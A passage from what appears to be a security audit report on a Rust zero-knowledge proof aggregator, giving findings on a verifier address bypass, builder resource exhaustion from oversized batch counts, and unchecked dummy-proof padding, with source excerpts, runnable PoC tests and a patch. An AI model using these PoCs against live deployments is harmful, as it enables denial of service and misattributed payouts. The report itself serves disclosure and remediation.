        .expect("vulnerable verifier accepts proof for a different configured aggregator address");

    let _ = std::fs::remove_dir_all(&bins_dir);
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 47 lines & 2.265625 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.48s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC proves the core authorization bypass at PublicBatchAggregator::verify using native public entry points: a non-dummy public-batch proof embedding attacker_address verified successfully through a backend configured with victim_address. It does not exercise any downstream consumer that might separately parse and reject aggregator_address, so the demonstrated impact is verifier-side identity bypass rather than a full external payout/misattribution workflow. First successful run was slow because circuit artifacts were generated from scratch (~772s).

### Validation reasoning

PoC validation command completed successfully.

---

# Oversized batch counts exhaust builder
**#97021**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/circuit-builder/src/main.rs` (3 locations)
#### Lines 6-17 — _The proof-count parser accepts any value from 1 through `MAX_PROOF_COUNT`._

```
/// Value parser that validates proof count is in range 1..=MAX_PROOF_COUNT
fn parse_proof_count(s: &str) -> Result<usize, String> {
    let n: usize = s
        .parse()
        .map_err(|_| format!("'{s}' is not a valid number"))?;
    if n == 0 {
        return Err("value must be at least 1".to_string());
    }
    if n > MAX_PROOF_COUNT {
        return Err(format!("value must be at most {MAX_PROOF_COUNT}"));
    }
    Ok(n)
```

⋯
#### Lines 28-35 — _Both batch dimensions use the same independent parser._

```
    /// Number of leaf proofs aggregated into a single private-batch proof (must be 1-1024)
    #[arg(short, long, value_parser = parse_proof_count)]
    num_leaf_proofs: usize,

    /// Number of inner private-batch proofs aggregated into a single public-batch proof (must be 1-1024 if specified)
    /// Omit this flag to only generate private-batch artifacts.
    #[arg(short, long, value_parser = parse_proof_count)]
    num_private_batch_proofs: Option<usize>,
```

⋯
#### Lines 55-60 — _The parsed values are forwarded directly into full artifact generation._

```
    generate_all_circuit_binaries(
        &args.output,
        !args.skip_prover,
        args.num_leaf_proofs,
        args.num_private_batch_proofs,
    )
```

### `wormhole/aggregator/src/config.rs`
#### Lines 6-14 — _The accepted maximum is 1024 despite comments noting much lower practical limits._

```
/// Maximum allowed proof count to prevent excessive memory/CPU consumption.
/// This is a reasonable upper bound - aggregating more than 1024 proofs per layer
/// would result in impractically large circuits.
///
/// In practice, even ~64 proofs is near the practical limit on commodity hardware
/// (current benches test up to 49). The 1024 cap is "obviously safe" headroom.
/// Any future need to raise this limit would require a coordinated artifact
/// regeneration across all deployments.
pub const MAX_PROOF_COUNT: usize = 1024;
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs`
#### Lines 271-297 — _Private-batch constraint construction performs nested scans over all exit slots._

```
    for slot in 0..num_exit_slots {
        let proof_idx = slot / 2;
        let output_idx = slot % 2;
        let (exit_slot, _amount_slot) = get_exit_and_amount(proof_idx, output_idx);

        // Check whether this exit appeared earlier (for dedupe)
        let mut is_duplicate = builder._false();
        for earlier in 0..slot {
            let earlier_proof_idx = earlier / 2;
            let earlier_output_idx = earlier % 2;
            let (exit_earlier, _) = get_exit_and_amount(earlier_proof_idx, earlier_output_idx);

            let matches_earlier = bytes_digest_eq(builder, exit_earlier, exit_slot);
            is_duplicate = builder.or(is_duplicate, matches_earlier);
        }

        // Sum all matching amounts across all 2*N outputs
        let mut acc = zero;
        for j in 0..num_exit_slots {
            let j_proof_idx = j / 2;
            let j_output_idx = j % 2;
            let (exit_j, amount_j) = get_exit_and_amount(j_proof_idx, j_output_idx);

            let matches = bytes_digest_eq(builder, exit_j, exit_slot);
            let conditional_amount = builder.select(matches, amount_j, zero);
            acc = builder.add(acc, conditional_amount);
        }
```

### `wormhole/aggregator/src/public_batch/circuit/constants.rs`
#### Lines 84-120 — _Public-batch output sizing multiplies the inner proof count by the private-batch leaf count._

```
#[inline]
pub const fn public_batch_total_exit_slots(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    n_inner * private_batch_exit_slots_count(private_batch_num_leaves)
}

#[inline]
pub const fn public_batch_total_nullifiers(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    n_inner * private_batch_nullifiers_count(private_batch_num_leaves)
}

#[inline]
pub const fn public_batch_exit_slots_start() -> usize {
    PUBLIC_BATCH_HEADER_LEN
}

#[inline]
pub const fn public_batch_nullifiers_start(
    n_inner: usize,
    private_batch_num_leaves: usize,
) -> usize {
    PUBLIC_BATCH_HEADER_LEN
        + public_batch_total_exit_slots(n_inner, private_batch_num_leaves)
            * PRIVATE_BATCH_EXIT_SLOT_LEN
}

#[inline]
pub const fn public_batch_pi_len(n_inner: usize, private_batch_num_leaves: usize) -> usize {
    PUBLIC_BATCH_HEADER_LEN
        + public_batch_total_exit_slots(n_inner, private_batch_num_leaves)
            * PRIVATE_BATCH_EXIT_SLOT_LEN
        + public_batch_total_nullifiers(n_inner, private_batch_num_leaves) * 4
```

## Description

The circuit-builder CLI treats `--num-leaf-proofs` and `--num-private-batch-proofs` as independently safe as long as each value is in `1..=MAX_PROOF_COUNT`, then forwards both values directly into circuit generation. `MAX_PROOF_COUNT` is 1024 even though the aggregator configuration comments state that even about 64 proofs is near the practical limit on commodity hardware. The generated private-batch circuit performs nested work over `2 * n_leaf` exit slots, including an earlier-slot duplicate scan and a full matching-amount scan for every slot. The public-batch layout multiplies the two user-controlled dimensions, so accepted inputs of 1024 leaves and 1024 private batches require output data and constraints proportional to more than a million forwarded leaf positions. A caller that can choose these CLI flags for an artifact-generation worker can submit maximum-but-valid values and force the worker into excessive circuit construction, memory allocation, and proving-artifact serialization before any rejection occurs.

## Root cause

The CLI and configuration validation bound each proof-count argument only by a large per-field maximum. They do not enforce a practical batch-size cap or a combined-work cap before invoking circuit builders whose work scales quadratically or multiplicatively with those counts.

## Impact

An artifact-generation service or CI worker exposing this CLI can be made unavailable by a single valid request using the documented maximum values. The attack does not require malformed input because the parser and `CircuitBinsConfig` both accept the counts before the expensive circuit builders run.

## Proof of concept

### Test case

```
use circuit_builder::generate_all_circuit_binaries;
use qp_wormhole_inputs as _;
use wormhole_aggregator as _;
use wormhole_circuit as _;
use wormhole_prover as _;
use wormhole_verifier as _;
use zk_circuits_common as _;

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread::sleep;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

const TEST_NAME: &str = "poc_oversized_batch_counts_exhaust_builder";
const CHILD_MODE_ENV: &str = "QP_POC_CHILD_MODE";
const OUTPUT_DIR_ENV: &str = "QP_POC_OUTPUT_DIR";
const NUM_LEAF_ENV: &str = "QP_POC_NUM_LEAF";
const NUM_INNER_ENV: &str = "QP_POC_NUM_INNER";

fn unique_output_dir(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock before unix epoch")
        .as_nanos();
    std::env::temp_dir().join(format!(
        "qp-zk-circuits-{label}-{}-{nonce}",
        std::process::id()
    ))
}

fn required_leaf_artifacts_exist(output_dir: &Path) -> bool {
    ["dummy_proof.bin", "common.bin", "verifier.bin"]
        .into_iter()
        .all(|name| output_dir.join(name).is_file())
}

#[test]
fn poc_oversized_batch_counts_exhaust_builder() {
    if std::env::var_os(CHILD_MODE_ENV).is_some() {
        let output_dir = std::env::var(OUTPUT_DIR_ENV).expect("missing child output dir");
        let num_leaf_proofs = std::env::var(NUM_LEAF_ENV)
            .expect("missing child num_leaf_proofs")
            .parse::<usize>()
            .expect("invalid child num_leaf_proofs");
        let num_private_batch_proofs = std::env::var(NUM_INNER_ENV)
            .expect("missing child num_private_batch_proofs")
            .parse::<usize>()
            .expect("invalid child num_private_batch_proofs");

        let _ = fs::remove_dir_all(&output_dir);
        generate_all_circuit_binaries(
            &output_dir,
            false,
            num_leaf_proofs,
            Some(num_private_batch_proofs),
        )
        .expect("oversized builder input should be accepted and begin artifact generation");
        return;
    }

    let output_dir = unique_output_dir("oversized-builder");
    let mut child = Command::new(std::env::current_exe().expect("current test binary path"))
        .arg("--exact")
        .arg(TEST_NAME)
        .arg("--nocapture")
        .env(CHILD_MODE_ENV, "1")
        .env(OUTPUT_DIR_ENV, &output_dir)
        .env(NUM_LEAF_ENV, "1024")
        .env(NUM_INNER_ENV, "1024")
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn child test process");

    let deadline = Instant::now() + Duration::from_secs(20);
    let mut observed_expensive_work = false;

    while Instant::now() < deadline {
        if required_leaf_artifacts_exist(&output_dir) {
            match child.try_wait().expect("poll child status") {
                None => {
                    observed_expensive_work = true;
                    break;
                }
                Some(status) => {
                    let output = child
                        .wait_with_output()
                        .expect("collect child output after early exit");
                    panic!(
                        "oversized counts were rejected or finished too early: status={status:?}, stderr={}",
                        String::from_utf8_lossy(&output.stderr)
                    );
                }
            }
        }

        sleep(Duration::from_millis(200));
    }

    if !observed_expensive_work {
        match child.try_wait().expect("final child poll") {
            Some(status) => {
                let output = child
                    .wait_with_output()
                    .expect("collect child output after timeout exit");
                panic!(
                    "oversized counts exited before observable expensive work: status={status:?}, stderr={}",
                    String::from_utf8_lossy(&output.stderr)
                );
            }
            None => {
                child.kill().expect("kill oversized child after timeout");
                let _ = child.wait();
                panic!(
                    "oversized counts kept running for 20s without finishing or being rejected, but no artifacts were emitted"
                );
            }
        }
    }

    assert!(
        required_leaf_artifacts_exist(&output_dir),
        "accepted max counts should emit real leaf artifacts before any rejection"
    );
    assert!(
        !output_dir.join("config.json").exists(),
        "config.json should not exist yet because the oversized build is still stuck in circuit generation"
    );

    child.kill().expect("terminate oversized child");
    let _ = child.wait();
    let _ = fs::remove_dir_all(&output_dir);
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --exact poc_oversized_batch_counts_exhaust_builder --nocapture
```

### Output

```
[output truncated: 30 lines & 1.1298828125 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.39s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

The PoC demonstrates the accepted-max attack path through the real `generate_all_circuit_binaries` entry point, not the CLI parser itself: a child process calls `generate_all_circuit_binaries(..., 1024, Some(1024))`, and the parent verifies that real artifacts (`dummy_proof.bin`, `common.bin`, `verifier.bin`) are emitted while the process is still running and before `config.json` exists. This proves the max-but-valid counts are accepted and expensive artifact generation starts before any rejection. To keep the test bounded and executable, it terminates the worker once that state is observed rather than waiting for full exhaustion/OOM or for public-batch artifact completion.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Added a separate practical artifact-generation cap of 64 proofs and enforced it in the shared CircuitBinsConfig validation path that generate_all_circuit_binaries already calls before any files are written. The CLI parser now uses the same practical cap, so oversized leaf/private-batch counts are rejected immediately instead of triggering quadratic private-batch and multiplicative public-batch circuit generation.

### Patch

```diff
diff --git a/wormhole/aggregator/src/config.rs b/wormhole/aggregator/src/config.rs
--- a/wormhole/aggregator/src/config.rs
+++ b/wormhole/aggregator/src/config.rs
@@ -1,185 +1,193 @@
 use anyhow::{anyhow, bail, Result};
 use serde::{Deserialize, Serialize};
 use std::fs::write;
 use std::path::Path;
 
-/// Maximum allowed proof count to prevent excessive memory/CPU consumption.
-/// This is a reasonable upper bound - aggregating more than 1024 proofs per layer
-/// would result in impractically large circuits.
+/// Absolute proof-count ceiling retained for compatibility with existing configs and
+/// downstream sizing assumptions. Practical artifact generation is capped lower by
+/// [`PRACTICAL_MAX_PROOF_COUNT`] before any expensive circuit construction begins.
+pub const MAX_PROOF_COUNT: usize = 1024;
+
+/// Practical proof-count ceiling for artifact generation.
 ///
 /// In practice, even ~64 proofs is near the practical limit on commodity hardware
-/// (current benches test up to 49). The 1024 cap is "obviously safe" headroom.
-/// Any future need to raise this limit would require a coordinated artifact
-/// regeneration across all deployments.
-pub const MAX_PROOF_COUNT: usize = 1024;
+/// (current benches test up to 49). Larger batch sizes drive private-batch circuit
+/// construction quadratically and public-batch layouts multiplicatively, so the
+/// builder rejects them up front before any expensive artifact generation begins.
+pub const PRACTICAL_MAX_PROOF_COUNT: usize = 64;
 
 /// Configuration stored alongside circuit binaries (config.json).
 /// This struct is used by both circuit-builder (to save config) and
 /// aggregator (to load config when aggregating proofs).
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CircuitBinsConfig {
     pub num_leaf_proofs: usize,
     /// Number of private-batch proofs per public batch (None = private batch only).
     /// Accepts the legacy `num_layer0_proofs` key when loading older config.json files.
     #[serde(alias = "num_layer0_proofs")]
     pub num_private_batch_proofs: Option<usize>,
 }
 
 impl CircuitBinsConfig {
     /// Create a new config with validation.
     ///
     /// # Errors
     /// Returns an error if:
-    /// - `num_leaf_proofs` is 0 or exceeds `MAX_PROOF_COUNT`
-    /// - `num_private_batch_proofs` is `Some(0)` or exceeds `MAX_PROOF_COUNT`
+    /// - `num_leaf_proofs` is 0 or exceeds `PRACTICAL_MAX_PROOF_COUNT`
+    /// - `num_private_batch_proofs` is `Some(0)` or exceeds `PRACTICAL_MAX_PROOF_COUNT`
     pub fn new(num_leaf_proofs: usize, num_private_batch_proofs: Option<usize>) -> Result<Self> {
         let config = Self {
             num_leaf_proofs,
             num_private_batch_proofs,
         };
         config.validate()?;
         Ok(config)
     }
 
     /// Validate the config values.
     ///
     /// # Errors
-    /// Returns an error if proof counts are zero or exceed reasonable bounds.
+    /// Returns an error if proof counts are zero or exceed practical generation bounds.
     pub fn validate(&self) -> Result<()> {
         if self.num_leaf_proofs == 0 {
             bail!("num_leaf_proofs must be > 0");
         }
-        if self.num_leaf_proofs > MAX_PROOF_COUNT {
+        if self.num_leaf_proofs > PRACTICAL_MAX_PROOF_COUNT {
             bail!(
-                "num_leaf_proofs ({}) exceeds maximum allowed ({})",
+                "num_leaf_proofs ({}) exceeds practical maximum allowed ({})",
                 self.num_leaf_proofs,
-                MAX_PROOF_COUNT
+                PRACTICAL_MAX_PROOF_COUNT
             );
         }
         if let Some(n) = self.num_private_batch_proofs {
             if n == 0 {
                 bail!("num_private_batch_proofs must be > 0 when specified");
             }
-            if n > MAX_PROOF_COUNT {
+            if n > PRACTICAL_MAX_PROOF_COUNT {
                 bail!(
-                    "num_private_batch_proofs ({}) exceeds maximum allowed ({})",
+                    "num_private_batch_proofs ({}) exceeds practical maximum allowed ({})",
                     n,
-                    MAX_PROOF_COUNT
+                    PRACTICAL_MAX_PROOF_COUNT
                 );
             }
         }
         Ok(())
     }
 
     /// Load config from a directory containing circuit binaries.
     ///
     /// # Errors
     /// Returns an error if the file cannot be read, parsed, or contains invalid values.
     pub fn load<P: AsRef<Path>>(bins_dir: P) -> Result<Self> {
         let config_path = bins_dir.as_ref().join("config.json");
         let config_str = std::fs::read_to_string(&config_path)
             .map_err(|e| anyhow!("failed to read {}: {}", config_path.display(), e))?;
         let config: Self = serde_json::from_str(&config_str)
             .map_err(|e| anyhow!("failed to parse {}: {}", config_path.display(), e))?;
         config.validate()?;
         Ok(config)
     }
 
     /// Save config to a directory
     pub fn save<P: AsRef<Path>>(&self, bins_dir: P) -> Result<()> {
         let config_path = bins_dir.as_ref().join("config.json");
         let config_str = serde_json::to_string_pretty(self)
             .map_err(|e| anyhow!("failed to serialize config: {}", e))?;
         write(&config_path, config_str)
             .map_err(|e| anyhow!("failed to write {}: {}", config_path.display(), e))?;
         println!("Config saved to {}", config_path.display());
         Ok(())
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{CircuitBinsConfig, MAX_PROOF_COUNT};
+    use super::{CircuitBinsConfig, MAX_PROOF_COUNT, PRACTICAL_MAX_PROOF_COUNT};
     use std::{
         fs,
         path::PathBuf,
         time::{SystemTime, UNIX_EPOCH},
     };
 
     fn temp_dir(name: &str) -> PathBuf {
         let suffix = SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .unwrap()
             .as_nanos();
         let dir = std::env::temp_dir().join(format!("qp-wormhole-config-{name}-{suffix}"));
         fs::create_dir_all(&dir).unwrap();
         dir
     }
 
     #[test]
     fn config_round_trip() {
         let dir = temp_dir("round-trip");
 
         let config = CircuitBinsConfig::new(7, Some(4)).unwrap();
         config.save(&dir).unwrap();
 
         let loaded = CircuitBinsConfig::load(&dir).unwrap();
         assert_eq!(loaded.num_leaf_proofs, 7);
         assert_eq!(loaded.num_private_batch_proofs, Some(4));
 
         fs::remove_dir_all(dir).unwrap();
     }
 
     #[test]
     fn config_without_public_batch() {
         let dir = temp_dir("no-public_batch");
 
         let config = CircuitBinsConfig::new(8, None).unwrap();
         config.save(&dir).unwrap();
 
         let loaded = CircuitBinsConfig::load(&dir).unwrap();
         assert_eq!(loaded.num_leaf_proofs, 8);
         assert_eq!(loaded.num_private_batch_proofs, None);
 
         fs::remove_dir_all(dir).unwrap();
     }
 
     #[test]
     fn new_rejects_zero_num_leaf_proofs() {
         let err = CircuitBinsConfig::new(0, Some(4)).unwrap_err();
         assert!(err.to_string().contains("num_leaf_proofs must be > 0"));
     }
 
     #[test]
     fn new_rejects_zero_num_private_batch_proofs() {
         let err = CircuitBinsConfig::new(16, Some(0)).unwrap_err();
         assert!(err
             .to_string()
             .contains("num_private_batch_proofs must be > 0"));
     }
 
     #[test]
     fn new_rejects_excessive_num_leaf_proofs() {
-        let err = CircuitBinsConfig::new(MAX_PROOF_COUNT + 1, None).unwrap_err();
-        assert!(err.to_string().contains("exceeds maximum"));
+        let err = CircuitBinsConfig::new(PRACTICAL_MAX_PROOF_COUNT + 1, None).unwrap_err();
+        assert!(err.to_string().contains("exceeds practical maximum"));
     }
 
     #[test]
     fn new_rejects_excessive_num_private_batch_proofs() {
-        let err = CircuitBinsConfig::new(16, Some(MAX_PROOF_COUNT + 1)).unwrap_err();
-        assert!(err.to_string().contains("exceeds maximum"));
+        let err = CircuitBinsConfig::new(16, Some(PRACTICAL_MAX_PROOF_COUNT + 1)).unwrap_err();
+        assert!(err.to_string().contains("exceeds practical maximum"));
     }
 
     #[test]
+    fn absolute_max_remains_above_practical_cap() {
+        assert!(MAX_PROOF_COUNT > PRACTICAL_MAX_PROOF_COUNT);
+    }
+
+    #[test]
     fn load_rejects_invalid_config() {
         let dir = temp_dir("invalid-config");
         // Write a config with zero num_leaf_proofs directly (bypassing new())
         let invalid_json = r#"{"num_leaf_proofs": 0, "num_private_batch_proofs": 4}"#;
         fs::write(dir.join("config.json"), invalid_json).unwrap();
 
         let err = CircuitBinsConfig::load(&dir).unwrap_err();
         assert!(err.to_string().contains("num_leaf_proofs must be > 0"));
 
         fs::remove_dir_all(dir).unwrap();
     }
 }

diff --git a/wormhole/circuit-builder/src/main.rs b/wormhole/circuit-builder/src/main.rs
--- a/wormhole/circuit-builder/src/main.rs
+++ b/wormhole/circuit-builder/src/main.rs
@@ -1,61 +1,61 @@
 use anyhow::Result;
 use clap::Parser;
 use qp_wormhole_circuit_builder::generate_all_circuit_binaries;
-use wormhole_aggregator::MAX_PROOF_COUNT;
+use wormhole_aggregator::config::PRACTICAL_MAX_PROOF_COUNT;
 
-/// Value parser that validates proof count is in range 1..=MAX_PROOF_COUNT
+/// Value parser that validates proof count is in range 1..=PRACTICAL_MAX_PROOF_COUNT
 fn parse_proof_count(s: &str) -> Result<usize, String> {
     let n: usize = s
         .parse()
         .map_err(|_| format!("'{s}' is not a valid number"))?;
     if n == 0 {
         return Err("value must be at least 1".to_string());
     }
-    if n > MAX_PROOF_COUNT {
-        return Err(format!("value must be at most {MAX_PROOF_COUNT}"));
+    if n > PRACTICAL_MAX_PROOF_COUNT {
+        return Err(format!("value must be at most {PRACTICAL_MAX_PROOF_COUNT}"));
     }
     Ok(n)
 }
 
 #[derive(Parser, Debug)]
 #[command(name = "qp-wormhole-circuit-builder")]
 #[command(about = "Generate wormhole circuit binaries for proving and verification")]
 struct Args {
     /// Output directory for generated binaries
     #[arg(short, long, default_value = "generated-bins")]
     output: String,
 
-    /// Number of leaf proofs aggregated into a single private-batch proof (must be 1-1024)
+    /// Number of leaf proofs aggregated into a single private-batch proof (must be 1-64)
     #[arg(short, long, value_parser = parse_proof_count)]
     num_leaf_proofs: usize,
 
-    /// Number of inner private-batch proofs aggregated into a single public-batch proof (must be 1-1024 if specified)
+    /// Number of inner private-batch proofs aggregated into a single public-batch proof (must be 1-64 if specified)
     /// Omit this flag to only generate private-batch artifacts.
     #[arg(short, long, value_parser = parse_proof_count)]
     num_private_batch_proofs: Option<usize>,
 
     /// Skip prover binary generation (only generate verifier binaries)
     #[arg(long)]
     skip_prover: bool,
 }
 
 fn main() -> Result<()> {
     let args = Args::parse();
 
     // Validation is handled by:
     // 1. clap value_parser at arg-parse time (range checks)
     // 2. CircuitBinsConfig::new inside generate_all_circuit_binaries (full validation)
 
     println!(
         "Generating circuit binaries (num_leaf_proofs={}, num_private_batch_proofs={})",
         args.num_leaf_proofs,
         args.num_private_batch_proofs.unwrap_or(0),
     );
 
     generate_all_circuit_binaries(
         &args.output,
         !args.skip_prover,
         args.num_leaf_proofs,
         args.num_private_batch_proofs,
     )
 }
```

### Affected files
- `wormhole/aggregator/src/config.rs`
- `wormhole/circuit-builder/src/main.rs`

### Validation output

```
[output truncated: 111 lines & 6.7470703125 KB skipped]
   2: poc::poc_oversized_batch_counts_exhaust_builder
             at ./tests/poc.rs:107:17
   3: poc::poc_oversized_batch_counts_exhaust_builder::{{closure}}
             at ./tests/poc.rs:39:48
   4: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   5: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Unchecked dummy proof padding
**#97026**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/public_batch/prover/lib.rs` (3 locations)
#### Lines 89-95 — _Public constructor accepts serialized dummy private-batch proof bytes and a raw proof-count config._

```
    pub fn new_from_bytes(
        public_batch_prover_only_bytes: &[u8],
        public_batch_common_bytes: &[u8],
        private_batch_common_bytes: &[u8],
        private_batch_verifier_only_bytes: &[u8],
        dummy_private_batch_proof_bytes: &[u8],
        config: (usize, usize), // (num_leaf_proofs, num_private_batch_proofs)
```

⋯
#### Lines 133-139 — _The dummy private-batch proof is only deserialized, with no verification or sentinel check._

```
        // 3) Load the dummy private-batch proof template used to pad partial batches
        let dummy_proof_template = ProofWithPublicInputs::<F, C, D>::from_bytes(
            dummy_private_batch_proof_bytes.to_vec(),
            &private_batch_verifier_data.common,
        )
        .map_err(|e| anyhow!("failed to deserialize dummy private-batch proof: {}", e))?;

```

⋯
#### Lines 245-257 — _Partial batches are padded by cloning the unchecked dummy template and filling it as an inner proof._

```
        // Pad partial batches with the dummy template. No shuffle: forwarding is
        // order-preserving by design (per-segment attribution on-chain).
        let num_dummies_needed = self.num_private_batch_proofs - proofs.len();
        for _ in 0..num_dummies_needed {
            proofs.push(self.dummy_proof_template.clone());
        }

        fill_public_batch_witness(
            &mut self.partial_witness,
            &targets,
            &proofs,
            aggregator_address_felts,
        )?;
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs` (2 locations)
#### Lines 178-188 — _The public-batch circuit classifies dummy inner proofs solely by zero private-batch block hash._

```
    // Dummy detection (sentinel: inner block_hash == 0, i.e. an all-dummy
    // private batch, mirroring the leaf-level sentinel one layer down)
    // -------------------------------------------------------------------------
    let dummy_sentinel = [zero, zero, zero, zero];
    let mut is_dummy_flags: Vec<BoolTarget> = Vec::with_capacity(n_inner);
    let mut block_hashes: Vec<[Target; 4]> = Vec::with_capacity(n_inner);
    for pis_i in private_batch_pi_targets.iter().take(n_inner) {
        let block_i: [Target; 4] =
            core::array::from_fn(|j| pis_i[pbc::PRIVATE_BATCH_BLOCK_HASH_OFFSET + j]);
        let is_dummy_i = bytes_digest_eq(builder, block_i, dummy_sentinel);
        is_dummy_flags.push(is_dummy_i);
```

⋯
#### Lines 267-292 — _Exit slots and nullifiers are zeroed only for slots classified as dummy; non-dummy slots are forwarded._

```
    // 5) Forward exit slots from all private-batch proofs, zeroing dummy inners'
    //    slots. Genuine dummies already carry zero slots; the select makes that
    //    an enforced invariant rather than a construction detail.
    let exit_slots_start = pbc::private_batch_exit_slots_start();
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for slot_idx in 0..private_batch_exit_slots_per_proof {
            let slot_base = exit_slots_start + slot_idx * pbc::PRIVATE_BATCH_EXIT_SLOT_LEN;
            // [sum(1), exit_account(4)]
            for j in 0..pbc::PRIVATE_BATCH_EXIT_SLOT_LEN {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[slot_base + j]);
                output_pis.push(forwarded);
            }
        }
    }

    // 6) Forward nullifiers from all private-batch proofs, zeroing dummy inners'
    //    nullifiers. This lets the chain skip them (no storage bloat) and lets a
    //    single dummy proof template fill several slots without collisions. Real
    //    nullifiers are hash outputs and are never zero.
    let nullifiers_start = pbc::private_batch_nullifiers_start(private_batch_num_leaves);
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for n_idx in 0..private_batch_nullifiers_per_proof {
            let base = nullifiers_start + n_idx * 4;
            for j in 0..4 {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[base + j]);
                output_pis.push(forwarded);
```

### `wormhole/aggregator/src/dummy_proof.rs`
#### Lines 1-12 — _The intended dummy proof invariant requires the zero block-hash/zero-output sentinel._

```
//! Universal dummy proof for padding aggregation batches.
//!
//! Dummy proofs use `block_hash = 0` AND `output_amounts = 0` as sentinel values.
//! The leaf circuit skips all validation (storage proof, block header, nullifier)
//! for proofs with these sentinels, allowing a single universal dummy proof to be
//! used for all aggregation batches.
//!
//! # Sentinel Values
//!
//! - `block_hash = [0u8; 32]` AND `output_amount_1 = 0` AND `output_amount_2 = 0`:
//!   Triggers bypass of all validation. Both conditions must be met to prevent
//!   an attacker from slipping funds through with a zero block hash.
```

## Description

`PublicBatchProver` treats the loaded `dummy_private_batch_proof_bytes` as a trusted padding template but never verifies that the deserialized proof is actually an all-dummy private-batch proof. The surrounding circuit logic identifies dummy inner proofs only by `block_hash == 0` and only zeroes exit slots and nullifiers for slots with that sentinel. `commit` pads partial batches by cloning `self.dummy_proof_template`, so a valid non-dummy private-batch proof supplied through `new_from_bytes` or a poisoned `dummy_private_batch_proof.bin` is inserted into every partial batch as if it were padding. If that template matches the real batch metadata, the public-batch circuit treats the padded slot as a real inner proof and forwards its exits and nullifiers into the public output. The loader should verify the template with the private-batch verifier and assert the dummy sentinel and zero forwarded payout semantics before storing it as padding material.

## Root cause

The padding proof is deserialized and stored without enforcing the semantic invariant that `dummy_proof_template` has the private-batch dummy sentinel and zero payout contribution. `commit` later clones that unchecked template into trusted padding slots.

## Impact

An attacker who can influence the dummy private-batch proof bytes can inject unintended private-batch outputs into partial public batches or repeatedly clone a real proof into padding slots. Downstream settlement that trusts the public-batch proof outputs can pay or attempt to process those unintended exits, while duplicate cloned nullifiers can also make otherwise valid partial batches fail settlement.

## Proof of concept

### Test case

```
use plonky2::{
    field::types::{Field, PrimeField64},
    iop::witness::PartialWitness,
    plonk::{
        circuit_data::{CircuitConfig, CircuitData, CommonCircuitData, VerifierOnlyCircuitData},
        config::PoseidonGoldilocksConfig,
        proof::ProofWithPublicInputs,
    },
    util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
};
use qp_wormhole_inputs::{
    BytesDigest, PrivateBatchPublicInputs, PublicBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN,
};
use test_helpers::fake_leaf::{build_fake_leaf_circuit, prove_fake_leaf};
use wormhole_aggregator::{
    private_batch::{
        circuit::circuit_logic::{PrivateBatchCircuit, PrivateBatchCircuitTargets},
        prover::fill_private_batch_witness,
    },
    public_batch::{
        circuit::circuit_logic::PublicBatchCircuit,
        prover::{PublicBatchInputs, PublicBatchProver},
    },
};
use zk_circuits_common::circuit::{C, D, F};

type Proof = ProofWithPublicInputs<F, C, D>;
type VerifierOnly = VerifierOnlyCircuitData<PoseidonGoldilocksConfig, D>;

fn proof_u64s(proof: &Proof) -> Vec<u64> {
    proof
        .public_inputs
        .iter()
        .map(|f| f.to_canonical_u64())
        .collect()
}

fn make_leaf_pi(
    amount1: u32,
    amount2: u32,
    exit1: [u64; 4],
    exit2: [u64; 4],
    nullifier: [u64; 4],
    block_hash: [u64; 4],
    block_number: u32,
) -> [F; PUBLIC_INPUTS_FELTS_LEN] {
    let mut out = [F::ZERO; PUBLIC_INPUTS_FELTS_LEN];
    out[0] = F::ZERO;
    out[1] = F::from_canonical_u64(amount1 as u64);
    out[2] = F::from_canonical_u64(amount2 as u64);
    out[3] = F::from_canonical_u64(10);

    for j in 0..4 {
